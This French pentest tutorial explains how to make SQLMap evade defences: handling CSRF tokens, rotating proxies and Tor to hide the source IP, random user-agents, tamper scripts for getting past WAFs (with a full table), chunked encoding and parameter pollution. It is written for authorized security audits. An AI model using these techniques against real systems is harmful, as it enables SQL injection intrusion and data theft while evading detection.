# Contournement des protections

Les applications modernes embarquent souvent des mécanismes de défense contre les injections SQL : jetons anti-CSRF, WAF, filtrage d'user-agent, validation côté serveur. SQLMap intègre nativement des options pour contourner la plupart de ces protections, à condition de savoir lesquelles activer et quand.

## Pourquoi

En pentest réel, on ne tombe presque jamais sur une injection SQL sans aucune couche de protection. Les formulaires utilisent des jetons CSRF, les serveurs inspectent le User-Agent, et un WAF (ModSecurity, Cloudflare, AWS WAF) peut bloquer les payloads classiques. Sans adaptation, SQLMap échoue silencieusement ou se fait bannir par IP. Comprendre les options de contournement permet de transformer un "paramètre non injectable" en exploitation réussie.

## Comment ça marche

### Jetons anti-CSRF

Les applications web protègent leurs formulaires avec des jetons CSRF (Cross-Site Request Forgery). Chaque requête doit inclure un jeton valide, sinon le serveur la rejette. SQLMap peut extraire automatiquement ce jeton depuis la réponse HTML précédente et l'injecter dans chaque nouvelle requête.

```bash
# - SQLMap récupère le jeton CSRF à chaque requête automatiquement
sqlmap -u "http://<IP_CIBLE>/page.php" --data="id=1&csrf-token=abc123" --csrf-token="csrf-token"
```

L'option `--csrf-token` indique à SQLMap le nom du paramètre contenant le jeton. L'outil parse alors la page de réponse, extrait la nouvelle valeur du jeton, et l'injecte dans la requête suivante.

### Paramètres à valeur unique

Certaines applications exigent qu'un paramètre contienne une valeur unique à chaque requête (un identifiant de session temporaire, un nonce, etc.). L'option `--randomize` génère automatiquement une valeur aléatoire de même format pour le paramètre ciblé.

```bash
# - Génère une valeur aléatoire pour le paramètre "uid" à chaque requête
sqlmap -u "http://<IP_CIBLE>/page.php?id=1&uid=839274" --randomize="uid"
```

### Paramètres calculés

Quand un paramètre doit respecter une relation précise avec un autre (hash, checksum, dépendance logique), l'option `--eval` permet d'exécuter du code Python avant chaque requête.

```bash
# - Recalcule le hash MD5 du paramètre "id" avant chaque envoi
sqlmap -u "http://<IP_CIBLE>/page.php?id=1&hash=abc" --eval="import hashlib; hash=hashlib.md5(id.encode()).hexdigest()"
```

Le code Python a accès aux valeurs des paramètres de la requête. SQLMap exécute ce snippet, met à jour les paramètres modifiés, puis envoie la requête.

## En pratique

### Masquage d'IP

Quand on lance des centaines de requêtes depuis la même IP, les systèmes de détection finissent par bloquer. Plusieurs options permettent de distribuer le trafic.

```bash
# - Router tout le trafic SQLMap via Burp (pour debug ou rotation)
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

```bash
# - Utiliser une liste de proxys en rotation
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --proxy-file=/chemin/vers/proxys.txt
```

```bash
# - Passer par le réseau Tor et vérifier que la connexion fonctionne
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --tor --check-tor
```

{% hint style="warning" %}
L'option `--tor` nécessite que le service Tor soit installé et actif sur la machine. Sous Exegol, vérifier que le service est démarré avant de lancer SQLMap. La latence Tor rallonge considérablement les scans.
{% endhint %}

### Contournement du User-Agent

Par défaut, SQLMap s'identifie avec son propre User-Agent (`sqlmap/x.x.x`). Un WAF ou un filtre basique peut bloquer les requêtes sur cette signature. L'option `--random-agent` utilise un User-Agent aléatoire tiré d'une base de navigateurs réels.

```bash
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --random-agent
```

{% hint style="info" %}
En audit, utiliser `--random-agent` devrait être un réflexe. Beaucoup de WAF filtrent sur le User-Agent avant même d'analyser le contenu de la requête.
{% endhint %}

### Détection et contournement de WAF

SQLMap tente de détecter automatiquement la présence d'un WAF. L'outil interne `identYwaf` analyse les réponses pour identifier le produit WAF en place. Si la détection elle-même déclenche des blocages, on peut la désactiver.

```bash
# - Désactiver la détection automatique de WAF (utile si la détection bloque l'IP)
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --skip-waf
```

### Tamper scripts

Les tamper scripts sont le mécanisme principal de contournement des WAF. Chaque script transforme le payload SQL avant envoi pour échapper aux règles de filtrage. On peut en chaîner plusieurs avec des virgules.

```bash
# - Appliquer deux tamper scripts en chaîne
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --tamper=between,randomcase
```

Voici la liste des tamper scripts les plus courants :

| Script | Transformation |
|---|---|
| `appendnullbyte` | Ajoute un octet NULL (`%00`) à la fin du payload |
| `base64encode` | Encode le payload en Base64 |
| `between` | Remplace `>` par `NOT BETWEEN 0 AND #` et `=` par `BETWEEN # AND #` |
| `charencode` | Encode chaque caractère en URL-encoding |
| `chardoubleencode` | Double URL-encoding de chaque caractère |
| `commalesslimit` | Remplace `LIMIT M,N` par `LIMIT N OFFSET M` (évite la virgule) |
| `equaltolike` | Remplace `=` par `LIKE` |
| `greatest` | Remplace `>` par `GREATEST(valeur, #)` |
| `halfversionedmorekeywords` | Ajoute un commentaire versionné MySQL partiel devant chaque mot-clé |
| `ifnull2ifisnull` | Remplace `IFNULL(A,B)` par `IF(ISNULL(A),B,A)` |
| `modsecurityversioned` | Encadre la requête dans un commentaire versionné MySQL |
| `modsecurityzeroversioned` | Encadre avec un commentaire versionné MySQL version zéro |
| `percentage` | Insère un signe `%` devant chaque caractère |
| `plus2concat` | Remplace `+` par la fonction `CONCAT()` |
| `randomcase` | Alterne majuscules et minuscules aléatoirement dans les mots-clés SQL |
| `randomcomments` | Insère des commentaires SQL (`/**/`) aléatoires dans les mots-clés |
| `space2comment` | Remplace les espaces par des commentaires SQL (`/**/`) |
| `space2dash` | Remplace les espaces par un tiret suivi d'un commentaire (`--`) et d'une lettre aléatoire |
| `space2hash` | Remplace les espaces par `#` suivi d'une lettre aléatoire et d'un retour à la ligne |
| `space2mssqlblank` | Remplace les espaces par un caractère blanc aléatoire (MSSQL) |
| `space2mssqlhash` | Remplace les espaces par `#` suivi d'un retour à la ligne (MSSQL) |
| `space2plus` | Remplace les espaces par `+` |
| `space2randomblank` | Remplace les espaces par un caractère blanc aléatoire |
| `symboliclogical` | Remplace `AND`/`OR` par `&&`/`||` |
| `unionalltounion` | Remplace `UNION ALL SELECT` par `UNION SELECT` |
| `unmagicquotes` | Remplace les guillemets par une séquence multioctet (bypass de `magic_quotes`) |
| `versionedkeywords` | Encadre chaque mot-clé SQL dans un commentaire versionné MySQL |
| `versionedmorekeywords` | Encadre chaque mot-clé (liste étendue) dans un commentaire versionné MySQL |

{% hint style="success" %}
Pour identifier quel tamper script utiliser, partir du WAF identifié. ModSecurity réagit bien à `modsecurityversioned` ou `space2comment`. Pour un filtrage basique sur les espaces, `space2comment` ou `space2plus` suffisent souvent. En cas de doute, combiner `between,randomcase,space2comment` couvre un bon nombre de filtres.
{% endhint %}

### Transfert par morceaux (Chunked)

L'option `--chunked` envoie les requêtes POST avec le header `Transfer-Encoding: chunked`. Le corps de la requête est découpé en morceaux, ce qui peut tromper les WAF qui inspectent le payload en une seule passe.

```bash
sqlmap -u "http://<IP_CIBLE>/page.php" --data="id=1" --chunked
```

### HTTP Parameter Pollution (HPP)

Le HPP consiste à envoyer le même paramètre plusieurs fois dans la requête. Selon le framework serveur, seule la première ou la dernière valeur est retenue, tandis que le WAF peut analyser l'autre. SQLMap gère cette technique automatiquement quand c'est pertinent.

{% hint style="info" %}
Le HPP est particulièrement efficace contre les WAF qui concatènent les valeurs des paramètres dupliqués. ASP/IIS prend toutes les valeurs séparées par une virgule, tandis que PHP prend la dernière. Cette divergence entre WAF et backend est exploitable.
{% endhint %}

## Pièges et galères

- **Trop de tamper scripts** : empiler tous les tamper scripts disponibles ralentit considérablement le scan et peut même casser les payloads. Commencer par un ou deux scripts ciblés, puis ajouter si nécessaire.
- **Tor sans vérification** : lancer `--tor` sans `--check-tor` ne garantit pas que le trafic passe effectivement par Tor. Si le service n'est pas actif, SQLMap envoie les requêtes directement.
- **CSRF et cache** : si l'application utilise un cache agressif, le jeton CSRF extrait peut être périmé avant d'être envoyé. Baisser le nombre de threads (`--threads=1`) ou ajouter `--fresh-queries` peut aider.
- **WAF adaptatif** : certains WAF apprennent les patterns au fil des requêtes. Un tamper script qui fonctionne au début peut se faire bloquer après quelques dizaines de requêtes. Varier les techniques ou espacer les requêtes avec `--delay`.

## Retour terrain

En mission, le contournement de WAF est souvent un jeu d'essai-erreur. La combinaison `--random-agent --tamper=between,space2comment` est un bon point de départ contre la plupart des WAF basiques. Pour ModSecurity en particulier, `modsecurityversioned` résout une bonne partie des cas.

Sur les applications avec tokens CSRF, l'erreur classique est d'oublier `--csrf-token` et de se retrouver avec des réponses 403 incompréhensibles. Dès qu'un formulaire POST retourne systématiquement des erreurs, vérifier la présence d'un jeton dans le HTML source.

L'option `--proxy` vers Burp (`127.0.0.1:8080`) reste indispensable en phase de debug. Observer les requêtes transformées par les tamper scripts dans Burp permet de comprendre exactement ce que SQLMap envoie et pourquoi le WAF bloque ou laisse passer.

## Mémo express

| Situation | Options |
|---|---|
| Formulaire avec jeton CSRF | `--csrf-token="nom_du_champ"` |
| Paramètre à valeur unique | `--randomize="param"` |
| Paramètre calculé (hash, etc.) | `--eval="code python"` |
| Masquer son IP via proxy | `--proxy="http://IP:PORT"` |
| Rotation de proxys | `--proxy-file=/chemin/liste.txt` |
| Passer par Tor | `--tor --check-tor` |
| User-Agent réaliste | `--random-agent` |
| Désactiver détection WAF | `--skip-waf` |
| Contournement WAF (tamper) | `--tamper=script1,script2` |
| Transfert chunked | `--chunked` |
| Debug dans Burp | `--proxy="http://127.0.0.1:8080"` |

***
